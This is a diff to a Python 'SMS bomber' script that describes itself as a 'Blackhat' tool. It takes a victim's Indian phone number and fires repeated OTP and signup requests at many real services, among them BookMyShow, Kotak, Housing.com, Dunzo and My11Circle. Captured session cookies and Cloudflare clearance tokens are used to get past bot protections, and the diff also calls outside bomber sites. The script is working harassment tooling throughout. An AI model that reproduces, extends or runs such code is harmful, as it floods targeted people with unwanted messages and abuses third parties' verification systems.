@@ -5,8 +5,7 @@
 
 
 # scripted by samay
-# Designed by vaimpier ritik 
-# email thread shark 
+# email thread 
 # sms bomb script 
 # 2021 
 
@@ -66,9 +65,9 @@ def bye():
     os.system('cls' if os.name=='nt' else 'clear')
     banner()
     string = """ 
-    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mVaimpier Ritik x sincryptzork x shark
-    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mVaimpierOfficial x Samay825 x shark
-    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@vaimpier_ritik x @sincryptzork x @0891322930
+    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mSamay
+    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mSamay825 
+    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@sincryptzork 
     """
     for letter in string:
         sleep(0.01) 
@@ -88,36 +87,20 @@ def front_interfere_look():
     banner()
     bye()
     chutmarike('[ 1 ] Blackhat x Sms :')
-    chutmarike('[ 2 ] Blackhat x Call :')
-    chutmarike('[ 3 ] Blackhat x Sms2 :')
-    chutmarike('[ 4 ] Blackhat x Custom Sms :')
-    chutmarike('[ 5 ] Blackhat x Whatsapp Bomber :')
-    chutmarike('[ 6 ] Blackhat x Update :')
-    chutmarike('[ 7 ] Blackhat x Exit :')
+    chutmarike('[ 2 ] Blackhat x Custom Sms :')
+    chutmarike('[ 3 ] Blackhat x Call')
+    chutmarike('[ 4 ] Blackhat x Update :')
+    chutmarike('[ 5 ] Blackhat x Exit')
     _under_()
     
 #-------------------v
-'''
+
 os.system('whoami > samay.txt')
 
 with open('samay.txt','r') as file:
     data = file.read()
 
-try:
-    okstt = data.split()[0]
-    if okstt=='u0_a1622':
-        os.remove('samay.txt')
-        pass
-    else:
-        _under_()
-        chutmarike('You are not premium user ..')
-        os.remove('samay.txt')
-        _under_()
-        sys.exit()
-    
-    
-except:
-    sys.exit()'''
+
 
 def _cls_front_under():
     clear()
@@ -134,7 +117,7 @@ class Samay:
         self.data = _user_com
         self.data2 = _user2
     def Passwordencrypt(self):
-        if self.data=='vaimsamay123' and self.data2=='vaimzork123':
+        if self.data=='prosamay1234' and self.data2=='prosamay9423' or self.data=='lilvaimpier' and self.data2=='lilvaimpierpro' or self.data=='farhaanpro' and self.data2=='farhaanpro1234' or self.data=='aayushpro' and self.data2=='aayushpro1234' or self.data=='vikas' and self.data2=='vikaspro':
             front_interfere_look()
             try:
                 ops_under = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire option : "+r))
@@ -159,8 +142,418 @@ class Mainscript:
     def scripting(self):
         if self.data_main==1:
             _cls_front_under()
-            number = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)
+            number = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r).strip()
             print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number+r)
+
+            def aakashin():
+                #
+                headers533 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Referer': 'https://www.aakash.ac.in/',
+                    # Already added when you pass json=
+                    # 'content-type': 'application/json',
+                    'Origin': 'https://www.aakash.ac.in',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                json_data533 = {
+                    'action': 'generate',
+                    'phone': number,
+                    'access': 'signup',
+                }
+
+                response533 = requests.post('https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/', headers=headers533, json=json_data533)
+                
+
+            def jio():
+                requests.get(f'https://www.jiomart.com/mst/rest/v1/id/details/{number}')
+
+            def bookmylauda():
+                url23 = 'https://in.bookmyshow.com/explore/home/national-capital-region-ncr'
+
+                bmsid = requests.get(url23).cookies['bmsId']
+                rgnsi = requests.get(url23).cookies['rgn']
+
+                cookies934 = {
+                    'bmsId': bmsid,
+                    'preferences': '%7B%22ticketType%22%3A%22M-TICKET%22%7D',
+                    'rgn': rgnsi,
+                    'G_ENABLED_IDPS': 'google',
+                    '__cfruid': 'e5af2b7583cd51cdd6cfc279a206c1e2d473f89b-1662927293',
+                }
+
+                headers934 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'application/json',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'Origin': 'https://in.bookmyshow.com',
+                    'DNT': '1',
+                    'Alt-Used': 'in.bookmyshow.com',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Referer': 'https://in.bookmyshow.com/explore/home/national-capital-region-ncr',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'bmsId=1.534074422.1661853985123; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; rgn=%7B%22Lat%22%3A%2228.6139%22%2C%22Seq%22%3A%222.0%22%2C%22Long%22%3A%2277.209%22%2C%22regionName%22%3A%22Delhi-NCR%22%2C%22regionCode%22%3A%22NCR%22%2C%22isOlaEnabled%22%3A%22N%22%2C%22regionCodeSlug%22%3A%22ncr%22%2C%22regionNameSlug%22%3A%22national-capital-region-ncr%22%7D; G_ENABLED_IDPS=google; __cfruid=e5af2b7583cd51cdd6cfc279a206c1e2d473f89b-1662927293',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                json_data934 = {
+                    'channel': 'phone',
+                    'subChannel': 'sms',
+                    'details': {
+                        'phone': number,
+                        'origin': 'https://in.bookmyshow.com',
+                    },
+                }
+
+
+
+                response934 = requests.post('https://in.bookmyshow.com/pwa/api/uapi/otp/send', cookies=cookies934, headers=headers934, json=json_data934)
+
+
+
+            def kotakbank():
+                #
+                url088 = 'https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/ahome2.action?source=811NewMicroSite&banner=NewMicrosite&pubild=Createanaccount'
+
+
+                gxx = requests.get(url088).cookies['JSESSIONID']
+                gxz = requests.get(url088).cookies['KB15499d7e']
+                ksxx = requests.get(url088).cookies['NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0']
+
+
+
+
+                cookies654 = {
+                    'JSESSIONID': gxx,
+                    'NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0': ksxx,
+                    'KB15499d7e': gxz,
+                    'KB8a0c9ae7431': '08dd64c758ab2000fc1343117ed10635874832c93138704dd0b9ce4ee34e4a6fd92d0866b59db519082fea408a113000c9ac55a1318104ffb69fa0ac5b25221c24fd50031e8e559c0fb3316f8be3d9040604efe27262c2b39ac5b460f9d3cde8',
+                }
+
+                headers654 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'application/json, text/javascript, */*; q=0.01',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'Origin': 'https://www.kotak.com',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Referer': 'https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/ahome2.action?source=811NewMicroSite&banner=NewMicrosite&pubild=Createanaccount',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'JSESSIONID=0000D9jwOnOVVIUWe7o1nkGpalH:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da345525d5f4f58455e445a4a42150c; KB15499d7e=152d7b9fc681677d75233eae1ec5833fb0e38fbc69c5ca483fada767f33a2de8ac2474862d3489a1e7c977b77cb94caddd0913fe11cdc22cfd0f64fbca77d8266382e4bf2d3dfe3620a1edd7bd5203fe08cf928266; KB8a0c9ae7431=08dd64c758ab2000fc1343117ed10635874832c93138704dd0b9ce4ee34e4a6fd92d0866b59db519082fea408a113000c9ac55a1318104ffb69fa0ac5b25221c24fd50031e8e559c0fb3316f8be3d9040604efe27262c2b39ac5b460f9d3cde8',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                }
+
+                params654 = {
+                    'source': '811NewMicroSite',
+                    'banner': 'NewMicrosite',
+                    'pubild': 'Createanaccount',
+                    'SWNToken': '1661849333037',
+                }
+
+
+
+                data654 = {
+                    'cust_full_name': 'okswani narayan',
+                    'cust_email': 'samaioseal@gmail.com',
+                    'cust_mobile': f'+91{number}',
+                    'cust_political_disclaimer': 'Yes',
+                    'cust_fatca_disclaimer': 'Yes',
+                }
+
+
+                response654 = requests.post('https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home.action', params=params654, cookies=cookies654, headers=headers654, data=data654)
+
+
+
+            def currybhai():
+
+
+                skooo = requests.get('https://madamcurry.in/order-online/').cookies['oo.cid']
+                cookies = {
+                    'AWSALB': '1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI',
+                    'AWSALBCORS': '1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI',
+                    'PHPSESSID': 'mncmtkvr75timpin3s8nkck3d2',
+                    'oo.cid': skooo,
+                }
+
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Content-Type': 'application/json;charset=utf-8',
+                    'Origin': 'https://madamcurry.in',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Referer': 'https://madamcurry.in/order-online/',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'AWSALB=1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI; AWSALBCORS=1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI; PHPSESSID=mncmtkvr75timpin3s8nkck3d2; oo.cid=s%3AaC5cuN735_90HQJbf8sFLWX_BOyh5B29.HV3lt%2FZM8a7tC4ss3bZ1Yr8IlyaU6A3XAnmaPYHr3lQ',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                }
+
+                json_data = {
+                    'userName': number,
+                    'otpPurpose': 'VERIFY_REGISTERATION',
+                    'onCall': False,
+                    'isEmailPrimary': False,
+                    'userDetails': {
+                        'primaryEmail': 'sehrat@gmail.com',
+                        'primaryMobile': number,
+                        'countryCode': '+91',
+                        'fullName': 'sehrati',
+                        'isRegistered': False,
+                    },
+                    'skipPrimaryCheck': False,
+                    'isNewUser': True,
+                }
+
+                response = requests.post('https://madamcurry.in/order-online/api/users/sendOtpToPrimary', cookies=cookies, headers=headers, json=json_data)
+
+
+            def hosing():
+                cookies679 = {
+                    'userCity': 'eec306948307d1a640ac',
+                    'cityUrl': 'pune',
+                    'service': 'buy',
+                    'category': 'residential',
+                    'subCategory': '',
+                    'ssrExperiments': 'Commercial_SERP_Desktop_Design_AB%3Dfalse%3Bhpv3%3Dfalse%3Bsort_filter_exp%3Dvar1%3Bserp_feedback_cta_v1%3Dfalse%3Bedge_hp_resale_pricing_ssr%3DvariantA%3Bfad_desktop%3Ddesign_2%3Bnp_verified%3Dfalse%3Bkhoj_rent_filterapi%3Dfalse',
+                    'experiments': 'remove_name_email%3Dtrue%3Bview_similar_properties%3Dgallery%3Bavm_arm_v2%3Dtrue%3Brequest_property_tour%3Dfalse%3Bnearby_societies%3Dfalse%3Beliminate_whatsapp_cta%3Dtrue%3Bvisit_together_exp%3Dfalse',
+                    '_psid': '1',
+                    'traffic': 'sourcemedium%3Dgoogle%20%2F%20organic%3B',
+                    'is_return_user': 'false',
+                    'is_return_session': 'false',
+                    'tvc_sm_fc_new': 'google%7Corganic',
+                    'tvc_sm_lc': 'google%7Corganic',
+                    '_uuid': '8fdce2fd8db3488257dbd6efd062c877',
+                    'request_method': 'POST',
+                }
+
+                headers679 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Referer': 'https://housing.com/',
+                    'phoenix-api-name': 'LOGIN_SEND_OTP_API',
+                    'app-name': 'desktop_web_buyer',
+                    'content-type': 'application/json; charset=UTF-8',
+                    'Origin': 'https://housing.com',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'userCity=eec306948307d1a640ac; cityUrl=pune; service=buy; category=residential; subCategory=; ssrExperiments=Commercial_SERP_Desktop_Design_AB%3Dfalse%3Bhpv3%3Dfalse%3Bsort_filter_exp%3Dvar1%3Bserp_feedback_cta_v1%3Dfalse%3Bedge_hp_resale_pricing_ssr%3DvariantA%3Bfad_desktop%3Ddesign_2%3Bnp_verified%3Dfalse%3Bkhoj_rent_filterapi%3Dfalse; experiments=remove_name_email%3Dtrue%3Bview_similar_properties%3Dgallery%3Bavm_arm_v2%3Dtrue%3Brequest_property_tour%3Dfalse%3Bnearby_societies%3Dfalse%3Beliminate_whatsapp_cta%3Dtrue%3Bvisit_together_exp%3Dfalse; _psid=1; traffic=sourcemedium%3Dgoogle%20%2F%20organic%3B; is_return_user=false; is_return_session=false; tvc_sm_fc_new=google%7Corganic; tvc_sm_lc=google%7Corganic; _uuid=8fdce2fd8db3488257dbd6efd062c877; request_method=POST',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                params679 = {
+                    'apiName': 'LOGIN_SEND_OTP_API',
+                    'isBot': 'false',
+                    'source': 'web',
+                }
+
+                json_data679 = {
+                    'query': '\
+  mutation($email: String, $phone: String, $otpLength: Int) {\
+    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\
+      success\
+      message\
+    }\
+  }\
+',
+                    'variables': {
+                        'phone': number,
+                    },
+                }
+
+                response679 = requests.post('https://mightyzeus.housing.com/api/gql', params=params679, cookies=cookies679, headers=headers679, json=json_data679)
+
+
+
+
+            def dunzo():
+                #
+                url459 = 'https://www.dunzo.com/pune'
+
+                dzer = requests.get(url459).cookies['dz_e']
+                connectsid = requests.get(url459).cookies['connect.sid']
+
+
+
+                cookies232 = {
+                    'dz_e': dzer,
+                    'connect.sid': connectsid,
+                }
+
+                headers232 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Content-Type': 'application/json;charset=utf-8',
+                    'X-APP-TYPE': 'PWA_WEB',
+                    'X-APP-VERSION': '2.0.0',
+                    'x-csrf-token': 'Kw1fzl0F-EwWo0SWq804pgF7uTZzWfmdI5EI',
+                    'correlation-id': '4ab8af80320b11edba39854730921313',
+                    'Origin': 'https://www.dunzo.com',
+                    'DNT': '1',
+                    'Alt-Used': 'www.dunzo.com',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                    'Referer': 'https://www.dunzo.com/pune',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'dz_e=NWRhMGNhODgtMTIxNy00NzhlLTgwYmQtZTdjNGU1MzZhN2E4X3Yx; connect.sid=s%3AYSj3CW6xFGodlifTu4oGJK0N_skqXvoV.n%2ByFUBmHV8jmMItQ0siIp4EigKulrvp%2B%2BYWN28dScPU',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                json_data232 = {
+                    'phone': number,
+                    'tos_accepted': True,
+                }
+
+
+
+                response232 = requests.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers, json=json_data)
+
+
+
+            def trell():
+
+                headers9978 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Referer': 'https://shop.trell.co/',
+                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                    'Origin': 'https://shop.trell.co',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                }
+
+                data9978 = {
+                    'phoneNo': number,
+                    'channel': 'sms',
+                    'website': 'shop.trell.co',
+                    'platform': 'web',
+                }
+
+
+                response9978 = requests.post('https://go-users-stage.trell.co/api/v2/auth/phone', headers=headers9978, data=data9978)
+                #
+
+            
+
+            def moglix():
+                cookies922 = {
+                    'AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg': '1075005958%7CMCIDTS%7C19235%7CMCMID%7C55691943638000510581611364707498664906%7CMCOPTOUT-1661852587s%7CNONE%7CvVersion%7C4.4.1',
+                    'AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg': '1',
+                    'user_sid': 's%3AYjSTH9cKnb3Zi7g5ZGUmaSz9JVPVvBzD.bl9ljQG8Cql%2FNJdHR8%2Bf2JNGDz5%2Bg22mNtqCxj30xQA',
+                }
+
+                headers922 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
+                    'x-access-token': 'fdf581372f273f8973ab5d1daa93eba7',
+                    'x-request-id': 'YjSTH9cKnb3Zi7g5ZGUmaSz9JVPVvBzD',
+                    'Origin': 'https://www.moglix.com',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1075005958%7CMCIDTS%7C19235%7CMCMID%7C55691943638000510581611364707498664906%7CMCOPTOUT-1661852587s%7CNONE%7CvVersion%7C4.4.1; AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1; user_sid=s%3AYjSTH9cKnb3Zi7g5ZGUmaSz9JVPVvBzD.bl9ljQG8Cql%2FNJdHR8%2Bf2JNGDz5%2Bg22mNtqCxj30xQA',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-site',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                json_data922 = {
+                    'email': '',
+                    'phone': number,
+                    'type': 'p',
+                    'source': 'signup',
+                    'device': 'desktop',
+                }
+
+
+
+                response922 = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', cookies=cookies922, headers=headers922, json=json_data922)
+
+
+            def mycircle():
+                url777 = 'https://www.my11circle.com'
+
+                s = requests.get(url777).cookies['SSID']#['NA_VISITOR']
+                k = requests.get(url777).cookies['NA_VISITOR']
+
+
+                cookies777 = {
+                    'sameSiteNoneSupported': 'true',
+                    'device.info.cookie': '{"bv":"91.0","bn":"Firefox","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}',
+                    'NA_VISITOR': k,
+                    'SSID': s,
+                    'ga24x7_pixeltracker': 'from_page%3Dlogin.html%26referrer_url%3Dhttps%253A%252F%252Fwww.my11circle.com%252F',
+                }
+
+                headers777 = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Referer': 'https://www.my11circle.com/player/login.html',
+                    # Already added when you pass json=
+                    # 'Content-Type': 'application/json',
+                    'Origin': 'https://www.my11circle.com',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    # Requests sorts cookies= alphabetically
+                    # 'Cookie': 'sameSiteNoneSupported=true; device.info.cookie={"bv":"91.0","bn":"Firefox","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; NA_VISITOR=2aded889-024c-4894-a8dd-0eba93e44b2a; SSID=SSID925230af-9877-478c-a60e-6db22a916109; ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3Dhttps%253A%252F%252Fwww.my11circle.com%252F',
+                    'Sec-Fetch-Dest': 'empty',
+                    'Sec-Fetch-Mode': 'cors',
+                    'Sec-Fetch-Site': 'same-origin',
+                    # Requests doesn't support trailers
+                    # 'TE': 'trailers',
+                }
+
+                json_data777 = {
+                    'mobile': number,
+                    'deviceId': '037ab70c-c70b-427c-ac39-1a7871c0e872',
+                    'deviceName': '',
+                    'refCode': '',
+                    'isPlaycircle': False,
+                }
+
+                response777 = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', cookies=cookies777, headers=headers777, json=json_data777)
             
             def simplehacker():
                 url877 = f'https://simplehacker.pythonanywhere.com/sms/{number}'
@@ -269,9 +662,36 @@ class Mainscript:
             
                 
             def fastpronumber():
-                cookies10 = {
+
+                cookies49990 = {
+                    'cf_clearance': '1umnyCHQCgGscfF.g.AgAM.Z2PS46D94gkYu6i8vlos-1661862896-0-150',
+                    'cf_chl_2': '83b4fe6455ca6de',
+                    'cf_chl_prog': 'x13',
+                }
+
+
+                cookiesfinal422samay = {
+                    'cf_clearance': 'VMJB.fGeLsyWnWm0DxZAr.bR7.YR7bMPSN4NDtsq3yQ-1661856628-0-150',
+                    'cf_chl_2': 'd72589e28da9926',
+                    'cf_chl_prog': 'x13',
+                }
+
+
+
+                cookiesfinalsamay = {
+                    'cf_clearance': '1BPRcJRjs3Sce2cHlCCb2XoW31Uz6jCbPOVZuH.xong-1661839492-0-150',
+                    'cf_chl_2': '950cd22602e8661',
+                    'cf_chl_prog': 'x13',
+                }
+
+
+                cookies122samay = {
                     'cf_clearance': 'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150',
                     '_pk_id.376245.6a19': '3f6ba316cc7c0364.1660033473.',
+                }
+                #
+                cookies10 = {
+                    'cf_clearance': 'RF50.jR3wBBFu53pFPUj8MNdCrECGRdgFwblxz5xJr4-1661844685-0-150',
                 }
 
                 headers10 = {
@@ -280,8 +700,7 @@ class Mainscript:
                     'Accept-Language': 'en-US,en;q=0.5',
                     'DNT': '1',
                     'Connection': 'keep-alive',
-                    # Requests sorts cookies= alphabetically
-                    # 'Cookie': 'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.',
+                    # 'Cookie': 'cf_clearance=RF50.jR3wBBFu53pFPUj8MNdCrECGRdgFwblxz5xJr4-1661844685-0-150',
                     'Upgrade-Insecure-Requests': '1',
                     'Sec-Fetch-Dest': 'document',
                     'Sec-Fetch-Mode': 'navigate',
@@ -296,62 +715,47 @@ class Mainscript:
                     'key': '@itztktricks',
                     'submit': 'Submit Query',
                 }
-                
-                #
+
                 response10 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies10, headers=headers10)
+                response101 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies122samay, headers=headers10)
+                response102 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookiesfinalsamay, headers=headers10)
+                response103 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookiesfinal422samay, headers=headers10)
+                response1035 = requests.get('https://freebomber.ml/tk/sms/bomber.php', params=params10, cookies=cookies49990, headers=headers10)
                 
                 
             def industrialapi():
-                url = 'https://www.industrybuying.com'
-                ol = requests.get(url).cookies
-                lsp = ol['SERVER']
+                #
+                
+
                 cookies8 = {
-                    'SERVER': lsp,
-                    '_gid': 'GA1.2.1210481606.1660515269',
-                    '_gat': '1',
-                    '_gcl_au': '1.1.2042821914.1660515269',
-                    'ib_referral': 'UTM',
-                    'ib_utm_date_time': 'Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time)',
-                    'ib_utm_source': 'Affiliate',
-                    'ib_utm_medium': 'icubeswire',
-                    'ib_utm_campaign': '3881_',
-                    'ib_activity_time': '8-15-2022 3:44:29',
-                    'LONG_SESSION_ID': '3552db7a-245b-2da6-be4e-1698aca530f6',
-                    '__sts': '{"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}',
-                    '__stp': '{"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}',
-                    '_ga': 'GA1.1.132751137.1660515269',
-                    '__stdf': '0',
-                    '__stgeo': '"0"',
-                    '__stbpnenable': '1',
-                    '_fbp': 'fb.1.1660515271441.504963341',
-                    '_hjSessionUser_2975779': 'eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=',
-                    '_hjFirstSeen': '1',
-                    '_hjIncludedInSessionSample': '0',
-                    '_hjSession_2975779': 'eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=',
-                    '__stat': '"BLOCK"',
-                    '_ga_YCSK09WVKB': 'GS1.1.1660515271.1.0.1660515277.0',
+                    'ib_referral': 'https://www.google.com/',
+                    'ib_utm_date_time': 'Invalid Date',
+                    'ib_activity_time': '9-1-2022 10:59:39',
                 }
 
                 headers8 = {
-                    'authority': 'www.industrybuying.com',
-                    'accept': '*/*',
-                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
-                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
+                    'Accept': '*/*',
+                    'Accept-Language': 'en-US,en;q=0.5',
+                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                    'X-Requested-With': 'XMLHttpRequest',
+                    'Origin': 'https://www.industrybuying.com',
+                    'DNT': '1',
+                    'Connection': 'keep-alive',
+                    'Referer': 'https://www.industrybuying.com/',
                     # Requests sorts cookies= alphabetically
-                    # 'cookie': 'SERVER=s1; _gid=GA1.2.1210481606.1660515269; _gat=1; _gcl_au=1.1.2042821914.1660515269; ib_referral=UTM; ib_utm_date_time=Mon Aug 15 2022 03:44:29 GMT+0530 (India Standard Time); ib_utm_source=Affiliate; ib_utm_medium=icubeswire; ib_utm_campaign=3881_; ib_activity_time=8-15-2022 3:44:29; LONG_SESSION_ID=3552db7a-245b-2da6-be4e-1698aca530f6; __sts={"sid":1660515270317,"tx":1660515270317,"url":"https%3A%2F%2Fwww.industrybuying.com%2F%3Futm_source%3DAffiliate%26utm_medium%3Dicubeswire%26utm_campaign%3D3881_","pet":1660515270317,"set":1660515270317}; __stp={"visit":"new","uuid":"74e35b34-b39f-44d7-84e3-fa54f411a210"}; _ga=GA1.1.132751137.1660515269; __stdf=0; __stgeo="0"; __stbpnenable=1; _fbp=fb.1.1660515271441.504963341; _hjSessionUser_2975779=eyJpZCI6IjVjZTM1MTY4LWVmOTQtNTQ4YS05ODY5LWI0ZTExM2ZiMWRkMCIsImNyZWF0ZWQiOjE2NjA1MTUyNzEzNTMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2975779=eyJpZCI6IjJmNzdlZGFjLWFmOWUtNGFlNC05YzI0LTk3MmI0MjY3YzJiMSIsImNyZWF0ZWQiOjE2NjA1MTUyNzIxODIsImluU2FtcGxlIjpmYWxzZX0=; __stat="BLOCK"; _ga_YCSK09WVKB=GS1.1.1660515271.1.0.1660515277.0',
-                    'dnt': '1',
-                    'origin': 'https://www.industrybuying.com',
-                    'referer': 'https://www.industrybuying.com/?utm_source=Affiliate&utm_medium=icubeswire&utm_campaign=3881_',
-                    'sec-fetch-dest': 'empty',
